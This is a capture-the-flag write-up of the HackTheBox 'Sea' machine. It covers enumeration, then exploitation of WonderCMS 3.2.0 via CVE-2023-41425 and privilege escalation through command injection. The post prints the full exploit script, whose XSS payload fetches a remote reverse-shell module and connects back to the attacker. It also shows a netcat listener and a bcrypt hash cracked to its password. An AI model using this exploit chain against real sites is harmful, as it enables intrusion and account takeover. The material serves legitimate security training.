---
title: "Hackthebox: sea [Machine] [Season 6]"
author: c3l1kd
categories: [Hackthebox]
tags:
  [Privilege Escalation, Reverse Shell, Nmap, wfuzz, Exploitation, Web Server]
render_with_liquid: false
img_path: /images/hackthebox_sea/
image:
  path: room_image.png
---

## Initial Enumeration

### Nmap Scan
```console
└─$ nmap -sV 10.10.11.28
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-15 00:29 CST
Nmap scan report for 10.10.11.28
Host is up (0.18s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 22.39 seconds
```
We have identified `2` ports using nmap,

- **22/SSH** - (`open`)
- **80/HTTP** - (`open`)
I took whatweb a look, but I didn’t see the hostname. I browsed with a browser and saw [`http://sea.htb/contact.php.`]Add hostname to `/etc/hosts`:

```console
└──╼ [★]$ echo "10.10.11.28 sea.htb" | sudo tee -a /etc/hosts 
10.10.11.28 sea.htb
```

## Let’s scan the path:

```console

└──╼ [★]$ ffuf -u http://sea.htb/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://sea.htb/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

# Priority ordered case sensative list, where entries were found  [Status: 200, Size: 3650, Words: 582, Lines: 87, Duration: 94ms]
#                       [Status: 200, Size: 3650, Words: 582, Lines: 87, Duration: 95ms]
# directory-list-2.3-medium.txt [Status: 200, Size: 3650, Words: 582, Lines: 87, Duration: 96ms]
# Attribution-Share Alike 3.0 License. To view a copy of this  [Status: 200, Size: 3650, Words: 582, Lines: 87, Duration: 191ms]
#                       [Status: 200, Size: 3650, Words: 582, Lines: 87, Duration: 285ms]
# Copyright 2007 James Fisher [Status: 200, Size: 3650, Words: 582, Lines: 87, Duration: 328ms]
#                       [Status: 200, Size: 3650, Words: 582, Lines: 87, Duration: 378ms]
# or send a letter to Creative Commons, 171 Second Street,  [Status: 200, Size: 3650, Words: 582, Lines: 87, Duration: 422ms]
# Suite 300, San Francisco, California, 94105, USA. [Status: 200, Size: 3650, Words: 582, Lines: 87, Duration: 516ms]
0                       [Status: 200, Size: 3650, Words: 582, Lines: 87, Duration: 93ms]
themes                  [Status: 301, Size: 230, Words: 14, Lines: 8, Duration: 93ms]
#                       [Status: 200, Size: 3650, Words: 582, Lines: 87, Duration: 941ms]
data                    [Status: 301, Size: 228, Words: 14, Lines: 8, Duration: 93ms]
                        [Status: 200, Size: 3650, Words: 582, Lines: 87, Duration: 3404ms]
home                    [Status: 200, Size: 3650, Words: 582, Lines: 87, Duration: 3404ms]
# license, visit http://creativecommons.org/licenses/by-sa/3.0/  [Status: 200, Size: 3650, Words: 582, Lines: 87, Duration: 3404ms]
# This work is licensed under the Creative Commons  [Status: 200, Size: 3650, Words: 582, Lines: 87, Duration: 2335ms]
# on atleast 2 different hosts [Status: 200, Size: 3650, Words: 582, Lines: 87, Duration: 3502ms]
plugins                 [Status: 301, Size: 231, Words: 14, Lines: 8, Duration: 92ms]
messages                [Status: 301, Size: 232, Words: 14, Lines: 8, Duration: 92ms]
404                     [Status: 200, Size: 3341, Words: 530, Lines: 85, Duration: 93ms]
```


Find some paths that will redirect, and then scan down:


```console
└──╼ [★]$ ffuf -u http://sea.htb/themes/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://sea.htb/themes/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

404                     [Status: 200, Size: 3341, Words: 530, Lines: 85, Duration: 92ms]
%20                     [Status: 403, Size: 199, Words: 14, Lines: 8, Duration: 92ms]
bike                    [Status: 301, Size: 235, Words: 14, Lines: 8, Duration: 111ms]
video games             [Status: 403, Size: 199, Words: 14, Lines: 8, Duration: 96ms]
spyware doctor          [Status: 403, Size: 199, Words: 14, Lines: 8, Duration: 92ms]
4%20Color%2099%20IT2    [Status: 403, Size: 199, Words: 14, Lines: 8, Duration: 93ms]
```

You will be redirected when you see bike, and then scan down to see:


```console
└──╼ [★]$ ffuf -u http://sea.htb/themes/bike/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://sea.htb/themes/bike/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

img                     [Status: 301, Size: 239, Words: 14, Lines: 8, Duration: 94ms]
                        [Status: 403, Size: 199, Words: 14, Lines: 8, Duration: 94ms]
# Attribution-Share Alike 3.0 License. To view a copy of this  [Status: 403, Size: 199, Words: 14, Lines: 8, Duration: 95ms]
# Priority ordered case sensative list, where entries were found  [Status: 403, Size: 199, Words: 14, Lines: 8, Duration: 95ms]
home                    [Status: 200, Size: 3650, Words: 582, Lines: 87, Duration: 95ms]
#                       [Status: 403, Size: 199, Words: 14, Lines: 8, Duration: 788ms]
#                       [Status: 403, Size: 199, Words: 14, Lines: 8, Duration: 1791ms]
# Suite 300, San Francisco, California, 94105, USA. [Status: 403, Size: 199, Words: 14, Lines: 8, Duration: 1791ms]
version                 [Status: 200, Size: 6, Words: 1, Lines: 2, Duration: 93ms]
# or send a letter to Creative Commons, 171 Second Street,  [Status: 403, Size: 199, Words: 14, Lines: 8, Duration: 2792ms]
# license, visit http://creativecommons.org/licenses/by-sa/3.0/  [Status: 403, Size: 199, Words: 14, Lines: 8, Duration: 2794ms]
# on atleast 2 different hosts [Status: 403, Size: 199, Words: 14, Lines: 8, Duration: 3796ms]
# This work is licensed under the Creative Commons  [Status: 403, Size: 199, Words: 14, Lines: 8, Duration: 3797ms]
# directory-list-2.3-medium.txt [Status: 403, Size: 199, Words: 14, Lines: 8, Duration: 3801ms]
# Copyright 2007 James Fisher [Status: 403, Size: 199, Words: 14, Lines: 8, Duration: 3802ms]
#                       [Status: 403, Size: 199, Words: 14, Lines: 8, Duration: 3805ms]
css                     [Status: 301, Size: 239, Words: 14, Lines: 8, Duration: 93ms]
#                       [Status: 403, Size: 199, Words: 14, Lines: 8, Duration: 4804ms]
summary                 [Status: 200, Size: 66, Words: 9, Lines: 2, Duration: 92ms]
404                     [Status: 200, Size: 3341, Words: 530, Lines: 85, Duration: 93ms]
LICENSE                 [Status: 200, Size: 1067, Words: 152, Lines: 22, Duration: 98ms]
%20                     [Status: 403, Size: 199, Words: 14, Lines: 8, Duration: 98ms]
video games             [Status: 403, Size: 199, Words: 14, Lines: 8, Duration: 96ms]
spyware doctor          [Status: 403, Size: 199, Words: 14, Lines: 8, Duration: 95ms]
4%20Color%2099%20IT2    [Status: 403, Size: 199, Words: 14, Lines: 8, Duration: 96ms]
nero 7                  [Status: 403, Size: 199, Words: 14, Lines: 8, Duration: 93ms]
cell phones             [Status: 403, Size: 199, Words: 14, Lines: 8, Duration: 93ms]

```
If you have the information, try to visit summary and LICENSE and you will see:


![/etc/hosts](01.png){: width="1200" height="800" }
![/etc/hosts](02.png){: width="1200" height="800" }
This makes me suspect that there are other git-related paths under this path. We open burp to facilitate our manual testing. The result:

![/etc/hosts](03.png){: width="1200" height="800" }

README.md is found…
Check online what WonderCMS is:

> WonderCMS is an extremely small flat file CMS. It’s fast, responsive and doesn’t require any configuration. It provides a simple way for creating and editing websites.

It seems to be a lightweight CMS. In order to search WonderCMS for any exploitable CVE, I re-executed it ffuf to sort out the exploitable information and found the version:
```console
└──╼ [★]$ ffuf -u http://sea.htb/themes/bike/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt | grep "Status: 200"

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://sea.htb/themes/bike/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

summary                 [Status: 200, Size: 66, Words: 9, Lines: 2, Duration: 92ms]
version                 [Status: 200, Size: 6, Words: 1, Lines: 2, Duration: 4979ms]
404                     [Status: 200, Size: 3341, Words: 530, Lines: 85, Duration: 97ms]
LICENSE                 [Status: 200, Size: 1067, Words: 152, Lines: 22, Duration: 93ms]
[WARN] Caught keyboard interrupt (Ctrl-C)
```

Found that the version is 3.2.0:

```console
└──╼ [★]$ curl http://sea.htb/themes/bike/version
3.2.0
```
Related exploit: `https://github.com/prodigiousMind/CVE-2023-41425`

```console
└──╼ [★]$ python3 exploit.py 
usage: python3 exploit.py loginURL IP_Address Port
example: python3 exploit.py http://localhost/wondercms/loginURL 192.168.29.165 5252
┌─[sg-vip-1]─[10.10.14.11]─[kazma@htb-dcoyyfmrg1]─[~/CVE-2023-41425]
└──╼ [★]$ python3 exploit.py http://sea.htb/themes/ 10.10.14.11 4444
[+] xss.js is created
[+] execute the below command in another terminal

----------------------------
nc -lvp 4444
----------------------------

send the below link to admin:

----------------------------
http://sea.htb/themes/"></form><script+src="http://10.10.14.11:8000/xss.js"></script><form+action="
----------------------------


starting HTTP server to allow the access to xss.js
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

Then after reading the description of github README.md, we will find that it is one click RCE, so let’s take a look at his exploit and simulate that click:

```console
└──╼ [★]$ cat exploit.py 
# Author: prodigiousMind
# Exploit: Wondercms 4.3.2 XSS to RCE


import sys
import requests
import os
import bs4

if (len(sys.argv)<4): print("usage: python3 exploit.py loginURL IP_Address Port\nexample: python3 exploit.py http://localhost/wondercms/loginURL 192.168.29.165 5252")
else:
  data = '''
var url = "'''+str(sys.argv[1])+'''";
if (url.endsWith("/")) {
 url = url.slice(0, -1);
}
var urlWithoutLog = url.split("/").slice(0, -1).join("/");
var urlWithoutLogBase = new URL(urlWithoutLog).pathname; 
var token = document.querySelectorAll('[name="token"]')[0].value;
var urlRev = urlWithoutLogBase+"/?installModule=https://github.com/prodigiousMind/revshell/archive/refs/heads/main.zip&directoryName=violet&type=themes&token=" + token;
var xhr3 = new XMLHttpRequest();
xhr3.withCredentials = true;
xhr3.open("GET", urlRev);
xhr3.send();
xhr3.onload = function() {
 if (xhr3.status == 200) {
   var xhr4 = new XMLHttpRequest();
   xhr4.withCredentials = true;
   xhr4.open("GET", urlWithoutLogBase+"/themes/revshell-main/rev.php");
   xhr4.send();
   xhr4.onload = function() {
     if (xhr4.status == 200) {
       var ip = "'''+str(sys.argv[2])+'''";
       var port = "'''+str(sys.argv[3])+'''";
       var xhr5 = new XMLHttpRequest();
       xhr5.withCredentials = true;
       xhr5.open("GET", urlWithoutLogBase+"/themes/revshell-main/rev.php?lhost=" + ip + "&lport=" + port);
       xhr5.send();
       
     }
   };
 }
};
'''
  try:
    open("xss.js","w").write(data)
    print("[+] xss.js is created")
    print("[+] execute the below command in another terminal\n\n----------------------------\nnc -lvp "+str(sys.argv[3]))
    print("----------------------------\n")
    XSSlink = str(sys.argv[1]).replace("loginURL","index.php?page=loginURL?")+"\"></form><script+src=\"http://"+str(sys.argv[2])+":8000/xss.js\"></script><form+action=\""
    XSSlink = XSSlink.strip(" ")
    print("send the below link to admin:\n\n----------------------------\n"+XSSlink)
    print("----------------------------\n")

    print("\nstarting HTTP server to allow the access to xss.js")
    os.system("python3 -m http.server\n")
  except: print(data,"\n","//write this to a file")
┌─[sg-vip-1]─[10.10.14.11]─[kazma@htb-dcoyyfmrg1]─[~/CVE-2023-41425]
└──╼ [★]$ curl 'http://sea.htb/themes/revshell-main/rev.php?lhost=10.10.14.11&lport=4444'
```

Successfully got revshell:

```console
└──╼ [★]$ nc -nlvp 4444
listening on [any] 4444 ...
connect to [10.10.14.11] from (UNKNOWN) [10.10.11.28] 59906
Linux sea 5.4.0-190-generic #210-Ubuntu SMP Fri Jul 5 17:03:38 UTC 2024 x86_64 x86_64 x86_64 GNU/Linux
 05:16:31 up 12:48,  0 users,  load average: 1.05, 0.80, 0.77
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$
```
As before, you can scroll to the database below and there is a password in it:

```console
www-data@sea:/var/www/sea/data$ cat database.js | grep password
cat database.js | grep password"password": "$2y$10$iOrk210RQSAzNCx6Vyq2X.aJ\/D.GuE4jRIikYiWrD3TM\/PjDnXm4q",
```
Use chatGPT to check and find out it is bcrypt. You can use cat to blast:

```console
└─$ echo -n '$2y$10$iOrk210RQSAzNCx6Vyq2X.aJ/D.GuE4jRIikYiWrD3TM/PjDnXm4q' > hash.txt

┌──(kazma㉿kali)-[~]
└─$ hashcat -m 3200 -a 0 -o output.txt hash.txt /usr/share/wordlists/rockyou.txt
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 5.0+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 16.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
==================================================================================================================================================
* Device #1: cpu-haswell-12th Gen Intel(R) Core(TM) i5-12400, 2918/5901 MB (1024 MB allocatable), 8MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 72

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Single-Hash
* Single-Salt

Watchdog: Hardware monitoring interface not found on your system.
Watchdog: Temperature abort trigger disabled.

Host memory required for this attack: 0 MB

Dictionary cache built:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344392
* Bytes.....: 139921507
* Keyspace..: 14344385
* Runtime...: 1 sec


Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 3200 (bcrypt $2*$, Blowfish (Unix))
Hash.Target......: $2y$10$iOrk210RQSAzNCx6Vyq2X.aJ/D.GuE4jRIikYiWrD3TM...DnXm4q
Time.Started.....: Thu Aug 15 14:53:15 2024 (20 secs)
Time.Estimated...: Thu Aug 15 14:53:35 2024 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:      151 H/s (6.55ms) @ Accel:8 Loops:16 Thr:1 Vec:1
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 3072/14344385 (0.02%)
Rejected.........: 0/3072 (0.00%)
Restore.Point....: 3008/14344385 (0.02%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:1008-1024
Candidate.Engine.: Device Generator
Candidates.#1....: blessing -> dangerous
.....
```

The result is in output.txt:
```console
└─$ cat output.txt 
$2y$10$iOrk210RQSAzNCx6Vyq2X.aJ/D.GuE4jRIikYiWrD3TM/PjDnXm4q:mychemicalromance
```
The password is `mychemicalromance`

```console
www-data@sea:/var/www/sea/data$ su amay 
su amay 
Password: mychemicalromance

amay@sea:/var/www/sea/data$ cat /home/amay/user.txt
cat /home/amay/user.txt
6f*************fg
```

After taking down the user…
After shopping around for two times and still not thinking about how to elevate the rights, I refer to the answers on the Internet to take a look at the services currently available on this machine:

```console
amay@sea:~$ netstat -tulpn
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:8080          0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:45763         0.0.0.0:*               LISTEN      -
tcp6       0      0 :::22                   :::*                    LISTEN      -
udp        0      0 127.0.0.53:53           0.0.0.0:*                           -
udp        0      0 0.0.0.0:68              0.0.0.0:*                           -
```

You will find that it has other local services such as 8080 port. We can transfer the traffic to our 48763 port through the following method, and we can see what its web service looks like:

```console
└──╼ [★]$ ssh -L 48763:localhost:8080 amay@10.10.11.28
The authenticity of host '10.10.11.28 (10.10.11.28)' can't be established.
ED25519 key fingerprint is SHA256:xC5wFVdcixOCmr5pOw8Tm4AajGSMT3j5Q4wL6/ZQg7A.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.11.28' (ED25519) to the list of known hosts.
amay@10.10.11.28's password: 
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-190-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

System information as of Thu 15 Aug 2024 08:29:06 AM UTC

  System load:  0.42              Processes:             259
  Usage of /:   73.9% of 6.51GB   Users logged in:       1
  Memory usage: 22%               IPv4 address for eth0: 10.10.11.28
  Swap usage:   0%


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

.......
amay@sea:~$
```

Go to our local browser and you will find that 48763 pops up a login page:

![/etc/hosts](04.png){: width="1200" height="800" }

Then we can log in by entering the only set of account passwords we currently know:

![/etc/hosts](05.png){: width="1200" height="800" }

After entering, you will see a system monitor page, click Analyze to see it The content of access.log is printed, so we try to read the content of `/root/root.txt` through burp:

![/etc/hosts](06.png){: width="1200" height="800" }

the response says there is no suspicious traffic, so it does not print.
Because we saw in the access log that our previous ffuf command seemed to be regarded as a malicious command, so after random testing, I found that if the command was truncated and added, ffuf it would be judged as suspicious traffic:

![/etc/hosts](07.png){: width="1200" height="800" }

CONGRATS YOU GOT `ROOT FLAG .`

![/etc/hosts](08.gif){: width="1200" height="800" }

